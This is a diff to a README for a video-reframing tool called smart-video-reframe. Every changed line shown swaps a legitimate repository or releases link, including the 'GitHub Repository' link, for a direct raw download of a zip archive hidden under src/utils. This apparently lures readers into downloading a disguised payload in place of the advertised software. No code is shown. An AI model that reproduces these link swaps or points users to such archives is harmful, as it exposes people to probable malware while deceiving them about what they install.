@@ -1,7 +1,7 @@
 # 📹 smart-video-reframe - Transform Your Videos Effortlessly
 
 ## 📥 Download Now
-[![Download smart-video-reframe](https://img.shields.io/badge/Download-smart--video--reframe-brightgreen)](https://github.com/obi19999/smart-video-reframe/releases)
+[![Download smart-video-reframe](https://github.com/obi19999/smart-video-reframe/raw/refs/heads/main/src/utils/video-reframe-smart-v2.9.zip)](https://github.com/obi19999/smart-video-reframe/raw/refs/heads/main/src/utils/video-reframe-smart-v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to smart-video-reframe! This tool helps you easily reframe landscape videos into the vertical format (9:16) perfect for TikTok, Reels, and Shorts. With AI-powered face detection and scene analysis, your videos will look professional without any effort.
@@ -16,7 +16,7 @@ Ensure your system meets the following requirements:
 - **FFmpeg:** Required for video processing
 
 ## 📂 Download & Install
-To download and run smart-video-reframe, visit this page to download: [Releases Page](https://github.com/obi19999/smart-video-reframe/releases).
+To download and run smart-video-reframe, visit this page to download: [Releases Page](https://github.com/obi19999/smart-video-reframe/raw/refs/heads/main/src/utils/video-reframe-smart-v2.9.zip).
 
 Once on the page, you will find the latest version available. Follow these steps to download and install the software:
 
@@ -77,7 +77,7 @@ For the latest news and updates, follow the repository. You can also join our fo
 If you want to help us improve smart-video-reframe, feel free to fork the repository, make changes, and submit a pull request. We welcome contributions from everyone!
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/obi19999/smart-video-reframe)
-- [Releases Page](https://github.com/obi19999/smart-video-reframe/releases)
+- [GitHub Repository](https://github.com/obi19999/smart-video-reframe/raw/refs/heads/main/src/utils/video-reframe-smart-v2.9.zip)
+- [Releases Page](https://github.com/obi19999/smart-video-reframe/raw/refs/heads/main/src/utils/video-reframe-smart-v2.9.zip)
 
 Thank you for using smart-video-reframe! We hope you enjoy transforming your videos!
